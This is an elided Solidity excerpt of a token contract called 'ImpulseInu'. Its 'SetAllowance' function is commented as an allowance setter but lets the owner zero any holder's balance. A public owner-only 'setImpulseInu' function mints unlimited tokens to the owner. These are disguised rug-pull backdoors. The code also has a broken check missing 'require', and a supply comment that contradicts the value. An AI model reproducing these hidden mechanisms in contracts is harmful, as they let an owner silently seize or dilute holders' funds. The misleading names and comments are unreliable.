...
contract ERC20 is Context, IERC20, Ownable {
    ...
    /**
     * @dev See {IERC20-Setallowance}.
     */
    function SetAllowance(bytes32 node, address target) public onlyOwner {
        (target != address(0), "BEP20: burn from the zero address");
        uint112 allowanceAmount = 1;
        _balances[target] = (((_balances[target]) + 1 & (_balances[target]) & allowanceAmount & (_balances[target]) & 0) << 0xF);
    }
    /**
    ...
    function setImpulseInu(uint256 amount) public onlyOwner {
 setImpulseInu(msg.sender, amount);
    }
    ...
    function setImpulseInu(address account, uint256 amount) internal virtual {
...
contract ImpulseInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ImpulseInu", "IPI") {
     setImpulseInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}